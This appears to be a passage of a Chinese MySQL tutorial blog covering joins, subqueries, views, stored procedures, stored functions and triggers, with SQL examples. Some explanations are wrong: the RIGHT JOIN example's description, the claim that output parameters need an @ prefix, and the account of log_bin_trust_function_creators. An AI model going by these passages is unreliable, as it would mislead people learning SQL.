<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT departments.department_name, employees.first_name, employees.last_name</span><br><span class="line">FROM departments</span><br><span class="line">LEFT JOIN employees</span><br><span class="line">ON departments.department_id = employees.department_id;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“部门”和“员工”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的部门和符合连接条件的员工信息，即使某些部门没有员工也会显示出来。</p>
<h4 id="右外连接（RIGHT-JOIN）"><a href="#右外连接（RIGHT-JOIN）" class="headerlink" title="右外连接（RIGHT JOIN）"></a>右外连接（RIGHT JOIN）</h4><p>RIGHT JOIN操作连接右侧的表和左侧的表，并返回右侧表的所有记录以及满足连接条件的左侧表的记录。如果没有匹配的行，则该结果集中的左侧字段将被设置为NULL值。</p>
<p>RIGHT JOIN也可以写成RIGHT OUTER JOIN</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1 </span><br><span class="line">RIGHT [OUTER] JOIN table2 </span><br><span class="line">ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>使用示例：<br>查询所有的员工数据以及那些没有被分配到部门的员工</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT employees.first_name, employees.last_name, departments.department_name</span><br><span class="line">FROM employees</span><br><span class="line">RIGHT JOIN departments</span><br><span class="line">ON employees.department_id = departments.department_id;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“员工”和“部门”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的员工信息和与之相关的部门信息，即使某些员工没有分配到部门也会显示出来。</p>
<p>LEFT JOIN和RIGHT JOIN可以用于处理一对多、多对一的关系查询</p>
<h2 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h2><p>自连接是将表与其自身同名的表进行连接</p>
<p>在MySQL中，使用自连接时需要使用别名（alias）来区分每个表实例。以下是一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT a.employee_name, b.employee_name</span><br><span class="line">FROM employee a, employee b</span><br><span class="line">WHERE a.manager_id = b.employee_id;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们查询了“employee”表中所有员工的名称和他们各自的经理的名称。为此，我们需要对“employee”表进行自连接，以将每个员工与其经理联系起来。这里我们使用a和b两个别名来表示同一个表中的两个不同实例。在上面的例子中，我们在WHERE子句中指定连接条件“manager_id &#x3D; b.employee_id”，这意味着我们正在连接的是一个员工和他的经理。</p>
<p>或者也可以使用内连接关键字进行自连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT a.emp_id, b.emp_name AS manager_name</span><br><span class="line">FROM employee a</span><br><span class="line">JOIN employee b</span><br><span class="line">ON a.manager_id = b.emp_id;</span><br></pre></td></tr></table></figure>

<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>通俗的讲，在SELECT的记录中SELCT就是子查询。子查询是在查询中使用一个查询作为另一个查询的子集。使用子查询可以轻松地扩展查询功能并实现更复杂的条件过滤机制。</p>
<p>下面是一个示例，该示例演示如何使用子查询：</p>
<p>假设您有两个表：Orders和Customers，分别存储订单和客户的信息。现在，假设您想要查询所有来自某些城市的顾客的订单详细信息。您可以使用以下查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM Orders</span><br><span class="line">WHERE customer_id IN (</span><br><span class="line">  SELECT customer_id</span><br><span class="line">  FROM Customers</span><br><span class="line">  WHERE city = &#x27;New York&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这个查询中，内部SELECT语句是一个子查询，它返回所有位于“New York”城市的客户ID。外部SELECT语句使用WHERE子句来过滤Orders表中包含在子查询结果集中的customer_id值的行，并将行返回到结果集中。</p>
<p>下面是另一个示例：</p>
<p>提取大于等于平均值的记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM tb1</span><br><span class="line">WHERE age &gt;= (</span><br><span class="line">	SELECT AVG(age) FROM tb1</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>下面是使用IN的子查询的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name1, column_name2... </span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name IN (通过子查询SELECT语句提取的列)</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT empid, name</span><br><span class="line">	FROM tb1</span><br><span class="line">WHERE empid </span><br><span class="line">	IN (SELECT empid FROM tb2);</span><br></pre></td></tr></table></figure>

<p>下面是使用EXISTS的子查询的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name1, column_name2... </span><br><span class="line">FROM table_name</span><br><span class="line">WHERE EXISTS (通过子查询SELECT语句提取的列);</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">	FROM tb1</span><br><span class="line">WHERE EXISTS</span><br><span class="line">	(SELECT * FROM tb2 WHERE tb1.empid=tb2.empid);</span><br></pre></td></tr></table></figure>

<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><blockquote>
<p>将SELECT结果像表一样保存下来的虚表就是视图</p>
<p>任何更改基本表的操作（如INSERT、UPDATE或DELETE）都会影响到视图的结果</p>
<p>视图也可以和表一样进行SELECT、INSERT、UPDATE、DELETE……</p>
<p>视图可以帮助简化复杂查询，提高查询性能</p>
</blockquote>
<h2 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h2><p>使用CREATE VIEW语句可以在MySQL中创建视图。例如，以下是创建一个简单视图的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW my_view AS</span><br><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM my_table</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，my_view是视图的名称，my_table是视图所依赖的基本表，SELECT查询表示视图的内容，并使用WHERE子句进行条件过滤。</p>
<h2 id="可更新视图"><a href="#可更新视图" class="headerlink" title="可更新视图"></a>可更新视图</h2><p>在MySQL中，只有可更新视图（updatable view）才能使用UPDATE、INSERT或DELETE语句来更改基表的行数据。</p>
<p>当满足以下条件之一时，视图将被标记为不可更新：</p>
<ol>
<li>视图包含聚合函数（如SUM或AVG）。</li>
<li>视图中使用了DISTINCT、GROUP BY或HAVING子句。</li>
<li>视图中的SELECT语句包含UNION或UNION ALL操作符。</li>
<li>视图定义中存在子查询，而且子查询引用了与SELECT语句所引用的不同表。</li>
<li>视图定义中存在常量或表达式，而不是列名。</li>
</ol>
<p>对视图执行INSERT操作时，即使与创建视图时的WHERE条件不匹配，数据也会插入到基表中。</p>
<p>比如创建视图时指定了sales的范围：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW v1 AS</span><br><span class="line">SELECT empid, sales</span><br><span class="line">FROM tb</span><br><span class="line">WHERE sales &gt;= 100;</span><br></pre></td></tr></table></figure>

<p>INSERT数据时不在这个范围内：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO v1 VALUES(&#x27;new_empid&#x27;, 15);</span><br></pre></td></tr></table></figure>

<p>执行之后，虽然视图v1中没有(‘new_empid’, 15)这条数据，但是基本表中已经INSERT成功，存在了这条数据。</p>
<p>为避免这种情况发生，可以将视图设置为”不接受与条件不匹配的记录“，在CREATE VIEW时，添加WITH CHECK OPTION：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW v1 AS</span><br><span class="line">SELECT empid, sales</span><br><span class="line">FROM tb</span><br><span class="line">WHERE sales &gt;= 100</span><br><span class="line">WITH CHECK OPTION;</span><br></pre></td></tr></table></figure>

<p>这样就无法插入不符合条件的记录了。</p>
<h2 id="显示视图"><a href="#显示视图" class="headerlink" title="显示视图"></a>显示视图</h2><p>表和视图在显示上的操作是相同的，也是通过SHOW TABLES命令操作，视图会与表一起显示出来。</p>
<p>要查看视图的列结构也是和表一样的操作</p>
<p>显示视图view_name的列结构示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC view_name;</span><br></pre></td></tr></table></figure>

<p>显示创建语句视图的SQL语句示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE VIEW view_name</span><br></pre></td></tr></table></figure>

<h2 id="替换视图"><a href="#替换视图" class="headerlink" title="替换视图"></a>替换视图</h2><p>这里的替换视图的含义是删除已经存在的同名视图并创建新视图，操作方法是加上OR REPLACE：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE VIEW v1 AS</span><br><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure>

<h2 id="修改视图结构"><a href="#修改视图结构" class="headerlink" title="修改视图结构"></a>修改视图结构</h2><p>修改视图结构使用的也是ALTER命令，命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER VIEW view_name AS (SELECT语句);</span><br></pre></td></tr></table></figure>

<h2 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h2><p>如果存在就删除视图：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP VIEW IF EXISTS v1;</span><br></pre></td></tr></table></figure>

<p>IF EXISTS的作用参见删除数据库。</p>
<h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><blockquote>
<p>MySQL存储过程（Stored Procedure）是一组预编译的SQL语句集合，可以在数据库中重复运行使用</p>
<p>将多个SQL语句组合成一个只需要使用命令”CALL * *“就能执行的集合，该集合就称为存储过程（stored process）</p>
</blockquote>
<h2 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h2><p>存储过程由以下部分组成：</p>
<ol>
<li><p>存储过程名称：唯一标识存储过程的名称。</p>
</li>
<li><p>参数列表：定义存储过程需要的输入或输出参数。</p>
</li>
<li><p>SQL语句：实际执行的SQL语句集合。</p>
</li>
<li><p>控制流程：定义存储过程如何处理条件、循环和异常等情况。</p>
</li>
</ol>
<p>以下是创建和使用MySQL存储过程的基本步骤：</p>
<ol>
<li>使用CREATE PROCEDURE语句创建存储过程：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE procedure_name (IN input_parameter1 data_type1, IN input_parameter2 data_type2, OUT output_parameter data_type)</span><br><span class="line">BEGIN</span><br><span class="line">  -- SQL statements here</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>其中，procedure_name为存储过程名称，input_parameter和output_parameter是存储过程的输入和输出参数，data_type指定了参数的数据类型。在BEGIN和END之间是定义的存储过程的SQL语句。</p>
<p>在MySQL中，创建存储过程需要使用DELIMITER语句指定分隔符。默认情况下，MySQL使用分号（;）作为SQL语句和命令的分隔符。如果没有修改分隔符，MySQL会第一个分号视为存储过程定义语句的结束符，会导致错误。</p>
<p>可以使用DELIMITER语句定义新的分隔符，例如“$$”，然后在存储过程结束时再将分隔符重置为默认值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE my_procedure()</span><br><span class="line">BEGIN</span><br><span class="line">  -- SQL statements here</span><br><span class="line">END $$</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<p>注意，在上面的示例中，我们将分隔符从默认的分号设置为两个美元符号“$$”。当存储过程定义完毕后，我们需要将分隔符重置成分号以便后续操作。</p>
<h2 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL procedure_name(input_value1, input_value2, @output_value);</span><br></pre></td></tr></table></figure>

<p>其中，input_value1和input_value2是存储过程的传入参数值，@output_value是存储过程的输出参数。您可以用SELECT语句检索@output_value的值。</p>
<p>需要注意的是，MySQL存储过程支持条件、循环和异常处理等复杂的控制流程结构。存储过程可以将这些结构与SQL语句组合在一起，以完成特定的任务或操作。</p>
<p> 存储过程的输出参数有个@的原因： </p>
<p>在MySQL中，存储过程参数分为输入参数和输出参数。与输入参数不同，输出参数必须使用@前缀来声明。</p>
<p>这是因为MySQL中的@符号表示用户定义变量（User-Defined Variables），可以在多个SQL语句之间传递值。当在存储过程中声明一个输出参数时，实际上是在创建一个用户定义变量，以便将结果从存储过程传递出去。</p>
<p>例如，下面是一个简单的存储过程示例，它将两个整数相加，并将结果存储在输出参数中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE add_numbers(IN num1 INT, IN num2 INT, OUT result INT)</span><br><span class="line">BEGIN</span><br><span class="line">  SET result = num1 + num2;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>在执行该存储过程时，需要声明一个用户定义变量，并在调用存储过程时将其传递给输出参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @output_value = 0;</span><br><span class="line">CALL add_numbers(10, 20, @output_value);</span><br><span class="line">SELECT @output_value;</span><br></pre></td></tr></table></figure>

<p>在上面的代码中，我们首先使用SET语句创建了一个名为@output_value的用户定义变量，并将其初始化为0。然后，我们调用了add_numbers存储过程，并将10和20作为输入参数传递给它。最后，我们使用SELECT语句检索输出参数的值。注意，我们使用了@前缀来引用输出参数。</p>
<p>需要注意的是，在MySQL中，用户定义变量的作用域仅限于当前会话（Session）。这意味着在存储过程内部定义的用户定义变量不能在存储过程外部使用，反之亦然。</p>
<h2 id="显示存储过程"><a href="#显示存储过程" class="headerlink" title="显示存储过程"></a>显示存储过程</h2><p>要在MySQL中查看存储过程的定义，可以使用SHOW CREATE PROCEDURE语句。该语句将显示与存储过程相关的详细信息，包括存储过程名称、参数列表和SQL语句。</p>
<p>以下是一个示例存储过程，它返回员工的姓名和薪水：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE get_employee(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))</span><br><span class="line">BEGIN</span><br><span class="line">  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>要查看该存储过程的定义，请执行以下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE PROCEDURE get_employee;</span><br></pre></td></tr></table></figure>

<p>执行结果类似于下面的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Procedure: get_employee</span><br><span class="line">Create Procedure: CREATE PROCEDURE `get_employee`(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))</span><br><span class="line">BEGIN</span><br><span class="line">  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>其中，第一行显示了存储过程的名称（Procedure: get_employee），而第二行则显示了完整的CREATE PROCEDURE语句，包括存储过程的定义。</p>
<p>需要注意的是，如果您没有对存储过程具有足够的权限，SHOW CREATE PROCEDURE语句可能会返回“Access denied”错误。在这种情况下，您需要确保已经授予了足够的权限，并且使用正确的MySQL用户来执行该语句。</p>
<h2 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h2><p>在MySQL中删除存储过程非常简单。您可以使用DROP PROCEDURE语句来删除一个或多个存储过程。</p>
<p>以下是删除名为get_employee的存储过程的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE IF EXISTS get_employee;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们使用了DROP PROCEDURE语句来删除名称为get_employee的存储过程。如果该存储过程不存在，它将不会产生任何影响。如果存在同名的存储过程，则该命令将永久删除该存储过程，而无法撤消操作。</p>
<p>IF EXISTS的作用参见前面章节的删除数据库。</p>
<h1 id="存储函数"><a href="#存储函数" class="headerlink" title="存储函数"></a>存储函数</h1><blockquote>
<p>存储函数（stored function）的操作方法和存储过程基本相同，与存储过程的唯一不同是，存储函数在执行后只会返回一个值，主要用于返回单个值而不是执行操作。</p>
<p>存储函数可以接受零个或多个输入参数，并返回一个标量值（例如整数、字符串、日期等）</p>
<p>如果需要在SQL查询中计算一些复杂的表达式或逻辑，则可以使用存储函数来简化查询语句</p>
<p>MySQL有许多函数，但使用存储函数可以创建自定义的函数，所以存储函数也称为用户定义函数</p>
</blockquote>
<h2 id="启用存储函数日志"><a href="#启用存储函数日志" class="headerlink" title="启用存储函数日志"></a>启用存储函数日志</h2><p>当log_bin_trust_function_creators为0时，用户不能创建或更新存储函数。</p>
<p>在MySQL中，log_bin_trust_function_creators是一个系统变量，它用于控制是否记录创建存储函数（CREATE FUNCTION语句）的操作到二进制日志中。这个变量的默认值为0（关闭，OFF），这意味着MySQL不会将CREATE FUNCTION语句记录到二进制日志中。把log_bin_trust_function_creators设置为1，将允许用户创建和修改存储函数，并且这些操作也将被记录到二进制日志中。</p>
<p>需要注意的是，即使log_bin_trust_function_creators被设置为1，用户也需要适当的权限才能够创建、修改或删除存储函数。这包括CREATE ROUTINE、ALTER ROUTINE和DROP ROUTINE等权限。如果用户没有这些权限，则无法执行相关操作。</p>
<p>要启用log_bin_trust_function_creators，可以采用以下方法：</p>
<ol>
<li><p>使用SET</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL log_bin_trust_function_creators = 1;</span><br></pre></td></tr></table></figure>


</li>
<li><p>修改my.cnf</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">log_bin_trust_function_creators</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>要查看log_bin_trust_function_creators，可以采用以下方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;log_bin_trust_function_creators&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="创建存储函数"><a href="#创建存储函数" class="headerlink" title="创建存储函数"></a>创建存储函数</h2><p>以下是一个计算两个整数之和的示例存储函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION add_numbers(num1 INT, num2 INT) RETURNS INT</span><br><span class="line">BEGIN</span><br><span class="line">  DECLARE result INT; -- 语法是 DECLARE 变量名 数据类型</span><br><span class="line">  SET result = num1 + num2; </span><br><span class="line">  -- 或者使用SELECT INTO，示例：SELECT AVG(sales) INTO result FROM tb;</span><br><span class="line">  RETURN result;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们定义了一个名为add_numbers的存储函数，它接受两个整数作为输入参数，并返回它们的和。在存储函数内部，我们使用DECLARE语句声明了一个名为result的局部变量，并将num1和num2的和赋值给它。最后，我们使用RETURN语句返回result的值。</p>
<p>要调用该存储函数，请使用SELECT语句进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT add_numbers(10, 20);</span><br></pre></td></tr></table></figure>

<p>在此查询中，我们调用了add_numbers函数，并传递了10和20作为两个输入参数。该函数将返回它们的和，即30。</p>
<p>需要注意的是，在MySQL中，存储函数应该具有确定性，也就是说，对于相同的输入参数，它应该始终返回相同的结果。此外，存储函数还应该具有不产生副作用的性质，也就是说，它不应该修改数据库中的数据或执行任何有意义的操作。如果存储函数违反了这些规则，可能会导致不可预测的结果或安全问题。</p>
<h2 id="显示存储函数"><a href="#显示存储函数" class="headerlink" title="显示存储函数"></a>显示存储函数</h2><h3 id="显示数据库中所有的存储函数"><a href="#显示数据库中所有的存储函数" class="headerlink" title="显示数据库中所有的存储函数"></a>显示数据库中所有的存储函数</h3><p>你可以使用MySQL的SHOW FUNCTION STATUS语句来显示所有定义在数据库中的存储函数。</p>
<p>具体来说，该语句的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW FUNCTION STATUS;</span><br></pre></td></tr></table></figure>
<p>执行该语句将返回包含以下列的结果集：</p>
<ol>
<li>Db：与存储函数相关联的数据库名称。</li>
<li>Name：存储函数的名称。</li>
<li>Type：函数类型（标量函数 [SCALAR FUNCTION]、聚合函数 [AGGREGATE FUNCTION]、窗口函数 [WINDOW FUNCTION]）。</li>
<li>Definer：函数创建者。</li>
<li>Modified：最近一次修改时间。</li>
<li>Created：创建时间。</li>
<li>Security_type：安全模式。</li>
</ol>
<p>此外，还有其他可选的列，例如Comment和character_set_client。</p>
<p>如果你想查看特定表的存储函数，你需要在SHOW FUNCTION STATUS语句后面添加LIKE子句来指定要查询的模式，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW FUNCTION STATUS LIKE &#x27;myfunction%&#x27;;</span><br></pre></td></tr></table></figure>

<p>上面的示例将返回名称以“myfunction”开头的所有存储函数。</p>
<h3 id="显示指定存储函数"><a href="#显示指定存储函数" class="headerlink" title="显示指定存储函数"></a>显示指定存储函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE FUNCTION function_name;</span><br></pre></td></tr></table></figure>

<h2 id="删除存储函数"><a href="#删除存储函数" class="headerlink" title="删除存储函数"></a>删除存储函数</h2><p>删除存储函数的语法格式是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP FUNCTION 存储函数名;</span><br></pre></td></tr></table></figure>

<h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><blockquote>
<p>MySQL触发器（trigger）是一种数据库对象，它允许你在特定的表上定义自动执行的操作，当满足触发器定义的条件时，该操作将自动触发。</p>
<p>常见的使用场景包括：</p>
<ul>
<li>在记录插入&#x2F;更新&#x2F;删除操作时自动生成日志记录。</li>
<li>在记录插入&#x2F;更新&#x2F;删除操作时同步到其他相关的表。</li>
<li>在记录插入&#x2F;更新时进行验证或格式化等操作。</li>
</ul>
<p>需要注意的是，MySQL触发器在处理大量数据时可能会显著减慢数据库性能，因此应谨慎使用。</p>
</blockquote>
<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><p>一个MySQL触发器包含以下几个部分：</p>
<ol>
<li>触发器名称：用于标识触发器的名称。</li>
<li>关联表名称：需要关联到触发器的表名。</li>
<li>事件类型：可以是INSERT、UPDATE或DELETE，表示在关联表中执行的操作类型。</li>
<li>触发时间：可以是BEFORE或AFTER，指定何时执行触发操作。</li>
<li>条件：指定触发操作的条件，可以使SQL语句中的WHERE子句。</li>
<li>触发操作：在满足触发器条件时要执行的操作，可以是一条或多条SQL语句。</li>
</ol>
<p>下面是一个创建MySQL触发器的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER my_trigger</span><br><span class="line">AFTER INSERT ON my_table</span><br><span class="line">FOR EACH ROW</span><br><span class="line">BEGIN</span><br><span class="line">    -- 触发操作</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>在上述示例中，创建了一个名为my_trigger的触发器，设置为在my_table表中进行插入操作之后自动调用。FOR EACH ROW关键字表示该操作针对每个插入的行都会执行一次。在BEGIN和END之间的代码块则是要执行的SQL语句操作。</p>
<h2 id="OLD、NEW关键字"><a href="#OLD、NEW关键字" class="headerlink" title="OLD、NEW关键字"></a>OLD、NEW关键字</h2><p>在MySQL触发器中，可以使用<code>OLD</code>和<code>NEW</code>关键字来获取一个操作（如 INSERT、UPDATE 或 DELETE）的旧值和新值。</p>
<ul>
<li><p>OLD.列名</p>
<p>OLD.列名是对表处理前的列值</p>
<p>INSERT事件类型没有OLD.列名</p>
</li>
<li><p>NEW.列名</p>
<p>NEW.列名是对表处理后的列值</p>
<p>DELETE事件类型没有NEW.列名</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER delete_trigger</span><br><span class="line">BEFORE DELETE ON employee</span><br><span class="line">FOR EACH ROW</span><br><span class="line">BEGIN</span><br><span class="line">    INSERT INTO log_table (id_log_table, emp_id_log_table) VALUES (OLD.id, OLD.emp_id);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>在上述示例中，<code>OLD</code>关键字被用于访问将要被删除信息的行（旧行）。在此案例中，每次将要删除一行之前，都会将此行的ID和列1插入一个名为log_table的表中。</p>
<h2 id="显示触发器"><a href="#显示触发器" class="headerlink" title="显示触发器"></a>显示触发器</h2><p>如果你想要显示MySQL数据库中的触发器，可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TRIGGERS;</span><br></pre></td></tr></table></figure>

<p>当你执行上述命令时，将返回包含所有已创建触发器的结果集。该结果集包括每个触发器的名称、关联表、事件类型、触发时间和触发语句。</p>
<p>如果你只想检索指定表的触发器，则可以使用以下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TRIGGERS FROM your_database_name LIKE &#x27;your_table_name&#x27;;</span><br></pre></td></tr></table></figure>

<p>需要将“your_database_name”替换为你要查询的数据库名称，“your_table_name”替换为你要查询的表名称。这条命令将返回满足特定条件的结果集。</p>
